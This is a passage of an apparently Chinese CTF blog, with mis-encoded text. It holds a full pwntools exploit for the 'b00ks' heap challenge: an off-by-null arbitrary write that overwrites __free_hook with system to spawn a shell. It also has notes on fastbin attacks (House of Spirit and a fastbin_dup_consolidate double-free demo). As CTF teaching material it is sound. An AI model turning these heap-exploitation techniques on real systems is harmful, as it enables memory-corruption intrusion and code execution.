<p>æˆ‘ä»¬ç”¨author nameçš„ç»“æŸç¬¦å°†å…¶ä½ä¸€å­—èŠ‚è¦†ç›–æˆâ€™\x00â€™åå°±ç­‰äº<code>0x000055b4705d9100</code>ï¼Œè€Œè¿™ä¸ªåœ°å€æ˜¾ç„¶å±äºæˆ‘ä»¬book_contentçš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªåœ°å€é™„è¿‘çš„å†…å®¹éƒ½æ˜¯å—æˆ‘ä»¬æ§åˆ¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨è¿™ä¸Šé¢ä¼ªé€ ä¸€ä¸ªbook_structï¼Œä»è€Œåœ¨editå‡½æ•°ä¸­è¾¾åˆ°ä»»æ„åœ°å€å†™çš„ç›®çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#part of leak heap_base</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1150</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of ä»»æ„åœ°å€å†™</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">0x16</span> + p64(<span class="number">1</span>)*<span class="number">2</span> + p64(heap_base) + p64(<span class="number">0x40</span>)) <span class="comment">#è¿™é‡Œæˆ‘ä»¬ä¼ªé€ äº†book_idã€book_contentæŒ‡é’ˆå’Œcontent_sizeï¼Œbook_nameæ²¡æœ‰ä¼ªé€ æ‰€ä»¥æ‰“å°book1çš„nameæ—¶ä¼šæŠ¥é”™</span></span><br><span class="line">chang_author_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>) <span class="comment">#è¿™é‡Œæˆ‘ä»¬ç”¨author nameçš„ç»“æŸç¬¦è¦†ç›–book_structæŒ‡é’ˆ</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;ccccccc&#x27;</span>) <span class="comment">#æˆ‘ä»¬å†æ¬¡ä¿®æ”¹book1çš„contentï¼Œå®é™…ä¸Šä¿®æ”¹çš„æ˜¯æˆ‘ä»¬æƒ³è¦å†™çš„åœ°å€</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æƒ³å¾€heap_baseè¿™ä¸ªåœ°å€é‡Œå†™å€¼ï¼Œæˆ‘ä»¬å¦‚ä¸Šæ„é€ ï¼Œç„¶åé‡å¤´æ¥çœ‹ä¸€é</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55a36a56a040</span><br><span class="line">0x55a36a56a040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a060:	0x000055a36b2bc150	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶<code>book_struct = 0x000055a36b2bc150 </code>ï¼Œæˆ‘ä»¬åœ¨<code>0x000055a36b2bc100</code>å¤„ä¼ªé€ å¥½<code>book_struct</code>ç»“æ„ä¹‹åå†è¦†ç›–æ‰<code>book_struct</code>çš„ä½ä¸€å­—èŠ‚ï¼Œå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55a36a56a040</span><br><span class="line">0x55a36a56a040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a060:	0x000055a36b2bc100	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„book_structæŒ‡é’ˆå·²ç»è¢«ä¿®æ”¹äº†ï¼Œæˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹<code>0x000055a36b2bc100</code>è¿™ä¸ªåœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x000055a36b2bc100</span><br><span class="line">0x55a36b2bc100:	0x0000000000000001	0x0000000000000001</span><br><span class="line">0x55a36b2bc110:	0x000055a36b2bb000	0x0000000000000040</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨è¿™ä¸ªåœ°å€ä¸­æ„é€ äº†è¿™æ ·çš„book_structï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å†æ‰§è¡Œ<code>edit(1,&#39;ccccccc&#39;)</code>ï¼Œé‚£ä¹ˆå®é™…ä¸Šå°±ä¼šå¾€<code>(*(*(off_202010 + i) + 16LL) == *(0x000055a36b2bc100 + 16) == 0x000055a36b2bb000</code> è¿™ä¸ªåœ°å€ä¸­å†™å€¼äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/gx 0x000055a36b2bb000</span><br><span class="line">0x55a36b2bb000:	0x0063636363636363</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œä¸ºæ­¢ä»»æ„åœ°å€å†™çš„è¯¦ç»†æ€è·¯åŠè¿‡ç¨‹å°±è®²å®Œäº†ï¼Œè¿™ä¹Ÿå°±æ˜¯æœ¬é¢˜å”¯ä¸€çš„éš¾ç‚¹ã€‚</p>
<p>æˆ‘ä»¬è¦ä»»æ„åœ°å€å†™çš„è¯å½“ç„¶æ˜¯å»åŠ«æŒhookæŒ‡é’ˆï¼Œå› ä¸ºFULL RELORçš„ç¼˜æ•…ã€‚é‚£ä¹ˆæˆ‘ä»¬å½“ç„¶è¿˜éœ€è¦æ³„æ¼libcã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹æ˜¯ï¼šç”¨mmapç”³è¯·çš„æ®µè·Ÿlibcä¹‹é—´çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªæå¤§çš„chunkä½¿å¾—å…¶æ”¾åœ¨mmapæ®µï¼Œå†æ³„éœ²å‡ºå…¶åœ°å€ï¼Œå‡å»ä¸€ä¸ªå›ºå®šçš„åç§»å³å¯å¾—åˆ°libcåŸºå€ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬è¯¥æ€ä¹ˆæ³„æ¼å‡ºbook2çš„åœ°å€å‘¢ï¼Ÿ</p>
<p>è¿™ä¸ªå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå› ä¸ºç¨‹åºä¸­æœ‰æ‰“å°bookç›¸å…³ä¿¡æ¯çš„åŠŸèƒ½ï¼Œå…¶æ‰€ä¾èµ–çš„åŒæ ·æ˜¯book_structç»“æ„ï¼Œè€Œæˆ‘ä»¬å‰é¢å·²ç»è®²äº†å¦‚ä½•ä¼ªé€ ä¸€ä¸ªbook_structï¼Œåœ¨æˆ‘ä»¬æœ‰äº†heap_baseä¹‹åï¼Œbook2çš„contentæŒ‡é’ˆçš„åœ°å€æˆ‘ä»¬åŒæ ·çŸ¥é“ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†ä¼ªé€ çš„book_structçš„nameæŒ‡é’ˆæ”¹æˆbook2çš„contentæŒ‡é’ˆçš„åœ°å€å°±å¯ä»¥åˆ©ç”¨æ‰“å°åŠŸèƒ½æ³„æ¼book2_contentçš„åœ°å€äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†libc_baseã€‚</p>
<p>æœ€åç»“åˆå‰é¢è®²çš„ä»»æ„åœ°å€å†™çš„æ–¹æ³•å°±å¯ä»¥åŠ«æŒhookæŒ‡é’ˆäº†</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size1,name,size2,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size1))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of leak heap_base</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1150</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of fake book_struct</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">0x16</span> + p64(<span class="number">1</span>) + p64(heap_base + <span class="number">0x11c0</span>) + p64(heap_base + <span class="number">0x1100</span> + <span class="number">16</span>) + p64(<span class="number">0x40</span>))</span><br><span class="line">name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of leak libc_base</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">5963792</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7f1e8f8f77a8</span> - <span class="number">0x00007f1e8f531000</span>)</span><br><span class="line">system = libc_base + (<span class="number">0x7fdb7950c3a0</span> - <span class="number">0x00007fdb794c7000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of hijack __free_hook</span></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook) + p64(<span class="number">0x8</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Balsn-CTF-2019-PlainText"><a href="#Balsn-CTF-2019-PlainText" class="headerlink" title="Balsn_CTF_2019-PlainText"></a>Balsn_CTF_2019-PlainText</h3><p>æ€è·¯ï¼š</p>
<p>åªæœ‰ä¸€ä¸ªoff-by-nullæ¼æ´ï¼Œèƒ½ç”¨è¿™ä¸ªæ¼æ´æŠŠbssæ®µä¸Šçš„å †æŒ‡é’ˆç›–æ‰ä¸€ä½ï¼Œæ•´ä½“æ€è·¯åº”è¯¥è·Ÿå‰é¢é‚£é¢˜ä¸€æ ·</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/" class="post-title-link" itemprop="url">å †åˆ©ç”¨-fastbin</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-03 17:47:14" itemprop="dateCreated datePublished" datetime="2022-05-03T17:47:14+08:00">2022-05-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-11 02:02:25" itemprop="dateModified" datetime="2022-05-11T02:02:25+08:00">2022-05-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å­¦äº†ä¸€æ®µæ—¶é—´å †ä¹‹åæ„Ÿè§‰å †çš„çŸ¥è¯†ç‚¹éƒ½å¤ªä¹±äº†ï¼Œå†™åšå®¢éƒ½ä¸å¥½åˆ†ç±»ï¼Œæ‰€ä»¥å°±åˆ†ä¸ªå¤§æ¦‚çš„ç±»æ¥å†™å§ï¼Œè¿™ç¯‡åšå®¢å†™çš„ä¸»è¦å…³äºfast binsç›¸å…³çš„ä¸œè¥¿</p>
<p>ä¸»è¦æ˜¯å…³äºhow2heapä¸­å­¦åˆ°çš„ä¸œè¥¿ï¼Œæ„Ÿè§‰è´´æºç æ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥åªå†™ä¸ªå¤§æ¦‚çš„æ€»ç»“ï¼Œæˆ–è€…æŒ‰ç…§æˆ‘çš„ç†è§£å»å†™ä¸€ä¸ªæºç </p>
<h3 id="å…³äºfast-binçš„ä¿æŠ¤"><a href="#å…³äºfast-binçš„ä¿æŠ¤" class="headerlink" title="å…³äºfast binçš„ä¿æŠ¤"></a>å…³äºfast binçš„ä¿æŠ¤</h3><ol>
<li>double freeï¼šä¸€ä¸ªchunkè¿›å…¥fast binæ—¶ï¼Œå…¶å®æ˜¯æ’å…¥è¿™ä¸ªbiné“¾è¡¨çš„å¤´éƒ¨ï¼Œmain_arenaä¼šè®¾ç½®ä¸€ä¸ªæŒ‡é’ˆç›´æ¥æŒ‡å‘è¿™ä¸ªå—ï¼ŒåŒæ—¶ä¸€ä¸ªchunkå‡†å¤‡è¿›å…¥è¯¥biné“¾è¡¨æ—¶ï¼Œä¼š<strong>æ£€æŸ¥main_arenaç›´æ¥æŒ‡å‘çš„å—</strong>è·Ÿè¿™ä¸ªå‡†å¤‡è¿›å…¥çš„å—æ˜¯å¦ç›¸åŒï¼Œç›¸åŒåˆ™æŠ›å‡ºdouble freeå¼‚å¸¸ã€‚ä¹Ÿå°±æ˜¯è¯´å…¶åªæ£€æŸ¥binçš„é“¾è¡¨å¤´ï¼Œä¸æ£€æŸ¥æ•´ä¸ªé“¾è¡¨</li>
<li>ä»fast binä¸­å–å‡ºä¸€ä¸ªchunkæ—¶ï¼Œä¼šæ£€æŸ¥è¯¥chunkçš„sizeä½æ˜¯å¦è·Ÿè¿™ä¸ªbiné“¾è¡¨å¯¹åº”çš„sizeç›¸ç¬¦ï¼Œä¸ç›¸ç¬¦åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚è¿™ä¸ªsizeçš„pä½ä¼šè¢«fast binå¿½ç•¥ï¼ˆä¹Ÿå°±æ˜¯è¯´æ— æ‰€è°“ï¼‰ï¼Œä½†æ˜¯åœ¨IS_MMAPPEDè·ŸNON_MAIN_ARENAè¿™ä¸¤ç§æƒ…å†µä¸‹ä¼šå‘ç”Ÿå¼‚å¸¸ã€‚</li>
</ol>
<h4 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h4><p>å®éªŒæµç¨‹ï¼šè®©ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå‡å—ï¼Œå°†å…¶freeæ‰å†mallocå‡ºæ¥ï¼Œå®ç°ä»»æ„åœ°å€åˆ†é…ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„ç‚¹ï¼šâ‘  å‡å—çš„sizeä½å¿…é¡»å±äºfast binèŒƒå›´å†…ã€‚â‘¡å‡å—çš„ä¸‹ä¸€ä¸ªå—çš„sizeä½å¿…é¡»è¢«è®¾ç½®æˆä¸€ä¸ªåˆç†çš„å€¼ï¼ˆåˆç†å³å¯ï¼‰ã€‚â‘¢ å‡å—çš„åœ°å€è¦å¯¹å…¶ã€‚â‘£ å‡å—çš„ISMMAPï¼ˆç”¨æ¥åˆ¤æ–­è¿™ä¸ªchunkæ˜¯å¦æ˜¯MMAPçš„é‚£ä¸€ä½ï¼‰ä¸èƒ½ä¸º1ï¼Œå› ä¸ºMMAPEDçš„å—è¢«freeæ‰æ—¶ä¼šå•ç‹¬å¤„ç†ã€‚</p>
<h4 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//é˜²æ­¢ç¬¬ä¸€ä¸ªchunkè¢«åˆå¹¶åˆ°top chunk</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">//è§¦å‘malloc_consolidate()</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now we malloc 1 = %p\n&quot;</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc 2 = %p&quot;</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>malloc_consolidate()å‡½æ•°ä¸»è¦æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼š</p>
<ol>
<li>è‹¥ fastbin æœªåˆå§‹åŒ–ï¼Œå³ global_max_fast ä¸º 0ï¼Œé‚£å°±åˆå§‹åŒ– malloc_stateã€‚</li>
<li>å¦‚æœå·²ç»åˆå§‹åŒ–çš„è¯ï¼Œå°±åˆå¹¶ fastbin ä¸­çš„ chunkã€‚</li>
</ol>
<p>å½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå †å—ï¼Œç¨‹åºéå†å®Œunsorted binéƒ½æ²¡æœ‰å‘ç°èƒ½æ»¡è¶³æˆ‘ä»¬éœ€æ±‚å¤§å°çš„chunkæ—¶ï¼Œä¾¿ä¼šæ‰§è¡Œmalloc_consolidate()ï¼Œå°†fast binä¸­å…¨éƒ¨èƒ½å¤Ÿåˆå¹¶çš„chunkè¿›è¡Œåˆå¹¶ï¼Œå¹¶å°†åˆå¹¶ä¹‹åçš„å¤§chunkæ”¾åˆ°å¯¹åº”çš„small binæˆ–è€…large binä¸­ï¼Œå¦‚æœæœ‰fast bin chunkè·Ÿtop chunkç›¸é‚»çš„è¯é‚£ä¹ˆä¼šå°†è¿™ä¸ªfast bin chunkåˆå¹¶åˆ°top chunké‡Œã€‚</p>
<p>è¿™æ˜¯æ‰§è¡Œ<code>malloc(0x400);</code>ä¹‹å‰çš„bins</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-1.jpg" class>

<p>å½“æˆ‘ä»¬æ‰§è¡Œ<code>malloc(0x400);</code>æ—¶ï¼Œä¾¿ä¼šè§¦å‘malloc_consolidate()ï¼Œå°†fast binä¸­çš„chunkè¿›è¡Œåˆå¹¶ï¼Œå¹¶æ”¾åˆ°å¯¹åº”çš„small/large binä¸­ã€‚</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-2.png" class>

<p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶åŸæœ¬çš„fast bin chunkè¢«æ”¾åˆ°äº†small binä¸­ï¼Œæ˜¾ç„¶å› ä¸ºæ­¤æ—¶0x50çš„fast binä¸­å·²ç»æ²¡æœ‰chunkäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»•è¿‡double freeçš„æ£€æŸ¥ï¼Œå†å°†p1 freeä¸€æ¬¡</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-3.jpg" class>

<p>è¿™æ ·p1æ‰€å¯¹åº”çš„chunkå°±ä¼šåŒæ—¶å‡ºç°åœ¨small binå’Œfast binä¸­</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-4.jpg" class>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">å‡ é“å…¥é—¨å †é¢˜çš„å¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-04-23 21:13:45" itemprop="dateCreated datePublished" datetime="2022-04-23T21:13:45+08:00">2022-04-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-03 17:43:25" itemprop="dateModified" datetime="2022-05-03T17:43:25+08:00">2022-05-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ol>
<li><p>å½“å­˜åœ¨uafæ¼æ´ï¼Œä¸”ç¨‹åºæœ¬èº«æä¾›äº†editè¿™æ ·å¯¹å †ä¸­çš„å†…å®¹ç›´æ¥ä¿®æ”¹çš„åŠŸèƒ½çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥ä¿®æ”¹fdæŒ‡é’ˆè¿›è¡Œå †å—ä¼ªé€ </p>
</li>
